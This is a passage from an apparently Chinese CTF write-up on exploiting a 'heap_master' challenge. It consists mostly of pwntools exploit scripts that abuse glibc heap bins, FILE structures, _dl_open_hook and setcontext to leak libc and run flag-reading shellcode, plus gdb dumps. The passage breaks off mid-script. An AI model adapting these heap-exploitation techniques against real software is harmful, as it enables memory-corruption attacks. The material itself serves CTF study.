class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    offset = <span class="number">0x8800</span><span class="number">-0x7a0</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#set two main_arena addr</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>+<span class="number">0x100</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#recover</span></span><br><span class="line">    <span class="comment">#Edit(0x330+0x30,p64(0)+p64(0x411))#2 again</span></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0x3f0</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x8</span>,p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p16(stdout_addr<span class="number">-0x10</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x18</span>+<span class="number">0x8</span>,p64(<span class="number">0</span>)+p16(stdout_addr+<span class="number">0x19</span><span class="number">-0x20</span>))</span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p.recvn(<span class="number">0x18</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd06e0</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">        <span class="comment">#map</span></span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0xc13b1800</span><span class="number">-0xc13a9000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x8800</span></span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd5683</span><span class="number">-0x7ffff7a37000</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    log.success(<span class="string">"map addr =&gt; "</span> + hex(map_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line">    libc.address =  libc_base</span><br><span class="line">    _dl_open_hook = libc_base + (<span class="number">0x7ffff7dd92e0</span><span class="number">-0x7ffff7a37000</span>)</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    mov_rdi_call_rbx = libc_base + <span class="number">0x7fd7d</span></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p64(_dl_open_hook<span class="number">-0x10</span>)+p64(<span class="number">0</span>)+p64(_dl_open_hook<span class="number">-0x20</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b *setcontext+53'</span>)</span><br><span class="line">    Edit(offset+<span class="number">0x8a0</span>,p64(mov_rdi_call_rbx))</span><br><span class="line">    Edit(offset+<span class="number">0x8a0</span>+<span class="number">0x40</span>,p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span>)+p64(map_addr+<span class="number">0x200</span>))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p_rsp = libc_base + <span class="number">0x0000000000003870</span></span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0x68</span>,p64(map_addr))</span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0x70</span>,p64(<span class="number">0x10000</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0x88</span>,p64(<span class="number">7</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0xa0</span>,p64(map_addr+offset+<span class="number">0x200</span>)+p64(libc.sym[<span class="string">'mprotect'</span>]))</span><br><span class="line">    <span class="comment">#sc</span></span><br><span class="line">    sc = asm(<span class="string">'mov rdi,'</span>+str(map_addr+offset))</span><br><span class="line">    sc += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            xor rsi,rsi</span></span><br><span class="line"><span class="string">            xor rdx,rdx</span></span><br><span class="line"><span class="string">            mov rax,2</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi,rax</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    sc += asm(<span class="string">'mov rsi,'</span>+str(map_addr+<span class="number">0x300</span>))</span><br><span class="line">    sc += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            mov rdx,48</span></span><br><span class="line"><span class="string">            mov rax,0</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi,1</span></span><br><span class="line"><span class="string">            mov rax,1</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    Edit(offset,<span class="string">'./flag\x00'</span>)</span><br><span class="line">    Edit(offset+<span class="number">0x1f8</span>,<span class="string">'./flag\x00\x00'</span>+p64(map_addr+<span class="number">0x208</span>)+sc)</span><br><span class="line">    <span class="comment">#offset+0x8900</span></span><br><span class="line">    Delete(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="leak-by-ub-attack-py"><a href="#leak-by-ub-attack-py" class="headerlink" title="leak_by_ub_attack.py"></a>leak_by_ub_attack.py</h3><p>这里泄露之后本想结束的，后来看xxrw里介绍了另一种orw的方法，利用__morecore，这个函数在main_arena+2024+0xa8处，它是用来平衡栈平衡的。我们用IO_list_all伪造文件结构体，调用_IO_str_overflow设置调用的rdi和调用函数，最后去调用setcontext(main_arena+2024)，在<br><em>(rdi+0xa0)利用之前的fastbinY的利用设置为rop_chain地址，在</em>(rdi+0xa8)设置为刚才的morecore，最后成功跳到rop_chain。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7f09c5962308 &lt;main_arena+2024&gt;:	0x00007f09c59622f8	0x00007f09c59622f8</span><br><span class="line">0x7f09c5962318 &lt;main_arena+2040&gt;:	0x00007f09c5962308	0x00007f09c5962308</span><br><span class="line">0x7f09c5962328 &lt;main_arena+2056&gt;:	0x00007f09c5962318	0x00007f09c5962318</span><br><span class="line">0x7f09c5962338 &lt;main_arena+2072&gt;:	0x00007f09c5962328	0x00007f09c5962328</span><br><span class="line">0x7f09c5962348 &lt;main_arena+2088&gt;:	0x00007f09c5962338	0x00007f09c5962338</span><br><span class="line">0x7f09c5962358 &lt;main_arena+2104&gt;:	0x00007f09c5962348	0x00007f09c5962348</span><br><span class="line">0x7f09c5962368 &lt;main_arena+2120&gt;:	0x00007f09c5962358	0x00007f09c5962358</span><br><span class="line">0x7f09c5962378 &lt;main_arena+2136&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f09c5962388 &lt;main_arena+2152&gt;:	0x00007f09c5961b20	0x0000000000000000</span><br><span class="line">0x7f09c5962398 &lt;main_arena+2168&gt;:	0x0000000000000001	0x0000000000021000</span><br><span class="line">0x7f09c59623a8 &lt;main_arena+2184&gt;:	0x000000008b2f3000	0x00007f09c56248c0</span><br><span class="line"></span><br><span class="line">0x7f09c56248c0 &lt;__GI___default_morecore&gt;:	sub    rsp,0x8</span><br><span class="line">0x7f09c56248c4 &lt;__GI___default_morecore+4&gt;:	call   0x7f09c5699e80 &lt;__GI___sbrk&gt;</span><br><span class="line">0x7f09c56248c9 &lt;__GI___default_morecore+9&gt;:	mov    edx,0x0</span><br><span class="line">0x7f09c56248ce &lt;__GI___default_morecore+14&gt;:	cmp    rax,0xffffffffffffffff</span><br><span class="line">0x7f09c56248d2 &lt;__GI___default_morecore+18&gt;:	cmove  rax,rdx</span><br><span class="line">0x7f09c56248d6 &lt;__GI___default_morecore+22&gt;:	add    rsp,0x8</span><br><span class="line">0x7f09c56248da &lt;__GI___default_morecore+26&gt;:	ret</span><br></pre></td></tr></table></figure>
<p>伪造文件结构体绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. fp-&gt;_flags &amp; _IO_NO_WRITES为假</span><br><span class="line">2. fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</span><br><span class="line">3. 2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</span><br><span class="line">4. new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 这里是劫持到的函数的rdi，即第一参数</span><br><span class="line">5. fp+0xe0指向需要劫持到的函数</span><br></pre></td></tr></table></figure>
<p>伪造的文件结构体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_IO_FILE = ( p64(0) +</span><br><span class="line">             p64(0)*3 +</span><br><span class="line">             p64(0) +                     # write_base</span><br><span class="line">             p64(0x7fffffffffffffff) +    # write_ptr</span><br><span class="line">             p64(0xdadaddaaddddaaaa) +</span><br><span class="line">             p64(0) +                     # buf_base</span><br><span class="line">             p64((morecore - 100) / 2) +  #  rdi   buf_end</span><br><span class="line">             p64(0xdadaddaaddddaaaa)*11 +</span><br><span class="line">             p64(0) + # + 0xa8</span><br><span class="line">             p64(0xdadaddaaddddaaaa)*6 +</span><br><span class="line">             p64(IO_str_j) +          # + 0xd8</span><br><span class="line">             p64(setcontext))</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK):</span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK):</span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK):</span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)</span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path))</span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x2620</span></span><br><span class="line">    elf = ELF(<span class="string">'./heap_master'</span>)</span><br><span class="line">    p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x5600</span></span><br><span class="line">    elf = change_ld(<span class="string">"./heap_master"</span>,<span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">    p = elf.process(env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        global_max_fast = <span class="number">0x37f8</span></span><br><span class="line">    <span class="comment">#ub attack</span></span><br><span class="line">    Edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x17e1</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x17e0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x17e0</span>+<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x17e0</span>+<span class="number">0x20</span>+<span class="number">0xf0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x17e0</span>+<span class="number">0x20</span>+<span class="number">0xf0</span>+<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>,p64(<span class="number">0xfbad1800</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x40</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x40</span>+<span class="number">0x90</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    Delete(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x40</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    last_two = <span class="number">0x26a3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x30</span>+<span class="number">0xa0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0xb0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Delete(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0xb0</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x10</span>+<span class="number">0xc0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0xc0</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x40</span>+<span class="number">0x10</span>,p16(last_two))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x40</span>+<span class="number">0x18</span>,p16(last_two))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x30</span>+<span class="number">0x10</span>,p16(last_two))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x30</span>+<span class="number">0x18</span>,p16(last_two))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x10</span>,p16(last_two))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x18</span>,p16(last_two))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x10</span>+<span class="number">0x10</span>,p16(last_two))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x10</span>+<span class="number">0x18</span>,p16(last_two))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#prepare</span></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x80</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x80</span>+<span class="number">0x100</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x80</span>+<span class="number">0x100</span>+<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x80</span>+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x100</span>)</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x80</span>+<span class="number">0x10</span>,p64(<span class="number">0xa000000</span>)+p16(<span class="number">0x3780</span>))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x70</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x70</span>+<span class="number">0x110</span>+<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x70</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span 